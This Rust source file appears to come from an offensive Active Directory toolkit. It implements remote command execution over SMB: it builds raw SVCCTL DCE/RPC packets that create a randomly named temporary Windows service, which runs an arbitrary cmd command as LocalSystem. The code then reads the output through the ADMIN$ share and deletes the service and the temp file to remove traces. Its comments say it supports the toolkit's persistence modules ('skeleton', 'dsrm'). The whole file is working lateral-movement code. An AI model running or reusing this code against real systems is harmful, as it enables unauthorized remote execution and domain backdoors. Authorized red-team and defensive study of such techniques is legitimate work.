//! Remote command execution utility via SMB + SVCCTL named pipe.
//!
//! Provides `run_remote_command()` which creates a temporary Windows service
//! on a target machine to execute a command, waits for output, then cleans up.
//!
//! Used internally by `skeleton` and `dsrm` modules that need to wire
//! persistence actions through the execution layer.

use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::smb::SmbSession;
use tracing::info;

/// Execute a command on a remote host via temporary service creation.
///
/// Flow:
/// 1. RPC Bind to SVCCTL
/// 2. OpenSCManagerW
/// 3. CreateServiceW with `%COMSPEC% /Q /c <cmd> > C:\<tmp>.tmp 2>&1`
/// 4. StartServiceW (runs the command)
/// 5. DeleteService + Close handles
/// 6. Read output from temp file via ADMIN$
/// 7. Delete temp file
pub async fn run_remote_command(smb: &SmbSession, command: &str) -> Result<String> {
    let output_file = format!("C:\\{:08x}.tmp", rand::random::<u32>());
    let svc_cmd = format!("%COMSPEC% /Q /c {} > {} 2>&1", command, output_file);
    let svc_name = format!("OT{:08X}", rand::random::<u32>());

    info!("[exec_util] Creating service '{}' on target", svc_name);

    // Step 1: RPC Bind to SVCCTL
    let bind_req = build_svcctl_bind();
    let bind_resp = smb.pipe_transact("svcctl", &bind_req).await?;
    if bind_resp.len() < 4 || bind_resp[2] != 12 {
        return Err(OverthroneError::custom("SVCCTL RPC bind rejected"));
    }

    // Step 2: OpenSCManagerW (opnum 15)
    let open_scm_req = build_open_scm_request("\\\\");
    let scm_resp = smb.pipe_transact("svcctl", &open_scm_req).await?;
    if scm_resp.len() < 48 {
        return Err(OverthroneError::custom("OpenSCManagerW response too short"));
    }
    let scm_handle = scm_resp[24..44].to_vec();

    // Step 3: CreateServiceW (opnum 12)
    let create_req = build_create_service_request(&scm_handle, &svc_name, &svc_cmd);
    let create_resp = smb.pipe_transact("svcctl", &create_req).await?;
    if create_resp.len() < 48 {
        // Cleanup SCM handle before returning error
        let _ = smb
            .pipe_transact("svcctl", &build_close_handle_request(&scm_handle))
            .await;
        return Err(OverthroneError::custom(
            "CreateServiceW failed — insufficient privileges?",
        ));
    }
    let svc_handle = create_resp[24..44].to_vec();

    // Step 4: StartServiceW (opnum 19) — may return error 1053 (normal for cmd)
    let start_req = build_start_service_request(&svc_handle);
    let _ = smb.pipe_transact("svcctl", &start_req).await;

    // Step 5: Wait a moment for command to complete
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;

    // Step 6: DeleteService + Close handles
    let _ = smb
        .pipe_transact("svcctl", &build_delete_service_request(&svc_handle))
        .await;
    let _ = smb
        .pipe_transact("svcctl", &build_close_handle_request(&svc_handle))
        .await;
    let _ = smb
        .pipe_transact("svcctl", &build_close_handle_request(&scm_handle))
        .await;

    // Step 7: Read output from temp file via ADMIN$ share
    let remote_path = output_file.trim_start_matches("C:\\");
    let output = match smb.read_file("ADMIN$", remote_path).await {
        Ok(data) => String::from_utf8_lossy(&data).to_string(),
        Err(e) => {
            info!("[exec_util] Could not read output file: {e}");
            String::new()
        }
    };

    // Step 8: Delete temp file
    let _ = smb.delete_file("ADMIN$", remote_path).await;
    info!("[exec_util] Command complete ({} bytes output)", output.len());

    Ok(output)
}

// ── SVCCTL DCE/RPC Packet Builders ─────────────────────────────

fn build_svcctl_bind() -> Vec<u8> {
    // SVCCTL UUID: 367abb81-9844-35f1-ad32-98f038001003
    let uuid: [u8; 16] = [
        0x81, 0xbb, 0x7a, 0x36, 0x44, 0x98, 0xf1, 0x35, 0xad, 0x32, 0x98, 0xf0, 0x38, 0x00,
        0x10, 0x03,
    ];

    let mut buf = Vec::new();
    buf.extend_from_slice(&[5, 0, 11, 3]); // version, type=bind, flags
    buf.extend_from_slice(&[0x10, 0, 0, 0]); // data rep
    let frag_offset = buf.len();
    buf.extend_from_slice(&[0x00, 0x00]); // frag_length (fill later)
    buf.extend_from_slice(&[0x00, 0x00]); // auth_len
    buf.extend_from_slice(&1u32.to_le_bytes()); // call_id
    buf.extend_from_slice(&4096u16.to_le_bytes()); // max xmit
    buf.extend_from_slice(&4096u16.to_le_bytes()); // max recv
    buf.extend_from_slice(&0u32.to_le_bytes()); // assoc group
    buf.push(1); // num context items
    buf.extend_from_slice(&[0, 0, 0]); // padding
    buf.extend_from_slice(&0u16.to_le_bytes()); // context id
    buf.push(1); // num transfer syntaxes
    buf.push(0);
    buf.extend_from_slice(&uuid);
    buf.extend_from_slice(&2u16.to_le_bytes()); // version major
    buf.extend_from_slice(&0u16.to_le_bytes()); // version minor
    // NDR transfer syntax
    buf.extend_from_slice(&[
        0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10,
        0x48, 0x60,
    ]);
    buf.extend_from_slice(&2u32.to_le_bytes());

    let frag_len = buf.len() as u16;
    buf[frag_offset..frag_offset + 2].copy_from_slice(&frag_len.to_le_bytes());
    buf
}

fn build_rpc_request(opnum: u16, stub: &[u8]) -> Vec<u8> {
    let mut pdu = Vec::new();
    pdu.push(5);
    pdu.push(0);
    pdu.push(0); // request
    pdu.push(0x03); // first+last
    pdu.extend_from_slice(&[0x10, 0, 0, 0]);
    let frag_len = (24 + stub.len()) as u16;
    pdu.extend_from_slice(&frag_len.to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes());
    pdu.extend_from_slice(&1u32.to_le_bytes());
    pdu.extend_from_slice(&(stub.len() as u32).to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes());
    pdu.extend_from_slice(&opnum.to_le_bytes());
    pdu.extend_from_slice(stub);
    pdu
}

fn ndr_conformant_string(s: &str) -> Vec<u8> {
    let utf16: Vec<u8> = s
        .encode_utf16()
        .chain(std::iter::once(0u16))
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let char_count = (s.len() + 1) as u32;

    let mut buf = Vec::new();
    buf.extend_from_slice(&0x00020000u32.to_le_bytes());
    buf.extend_from_slice(&char_count.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.extend_from_slice(&char_count.to_le_bytes());
    buf.extend_from_slice(&utf16);
    while buf.len() % 4 != 0 {
        buf.push(0);
    }
    buf
}

fn build_open_scm_request(machine_name: &str) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(&ndr_conformant_string(machine_name));
    stub.extend_from_slice(&0u32.to_le_bytes()); // lpDatabaseName (NULL)
    stub.extend_from_slice(&0x000F003Fu32.to_le_bytes()); // SC_MANAGER_ALL_ACCESS
    build_rpc_request(15, &stub)
}

fn build_create_service_request(scm_handle: &[u8], name: &str, bin_path: &str) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(scm_handle);
    stub.extend_from_slice(&ndr_conformant_string(name));
    stub.extend_from_slice(&0u32.to_le_bytes()); // lpDisplayName (NULL)
    stub.extend_from_slice(&0x000F01FFu32.to_le_bytes()); // SERVICE_ALL_ACCESS
    stub.extend_from_slice(&0x00000010u32.to_le_bytes()); // SERVICE_WIN32_OWN_PROCESS
    stub.extend_from_slice(&0x00000003u32.to_le_bytes()); // SERVICE_DEMAND_START
    stub.extend_from_slice(&0x00000001u32.to_le_bytes()); // SERVICE_ERROR_NORMAL
    stub.extend_from_slice(&ndr_conformant_string(bin_path));
    stub.extend_from_slice(&0u32.to_le_bytes()); // lpLoadOrderGroup
    stub.extend_from_slice(&0u32.to_le_bytes()); // lpdwTagId
    stub.extend_from_slice(&0u32.to_le_bytes()); // lpDependencies
    stub.extend_from_slice(&0u32.to_le_bytes()); // cbDependSize
    stub.extend_from_slice(&0u32.to_le_bytes()); // lpServiceStartName (LocalSystem)
    stub.extend_from_slice(&0u32.to_le_bytes()); // lpPassword
    stub.extend_from_slice(&0u32.to_le_bytes()); // cbPasswordSize
    build_rpc_request(12, &stub)
}

fn build_start_service_request(svc_handle: &[u8]) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(svc_handle);
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    build_rpc_request(19, &stub)
}

fn build_delete_service_request(svc_handle: &[u8]) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(svc_handle);
    build_rpc_request(2, &stub)
}

fn build_close_handle_request(handle: &[u8]) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(handle);
    build_rpc_request(0, &stub)
}
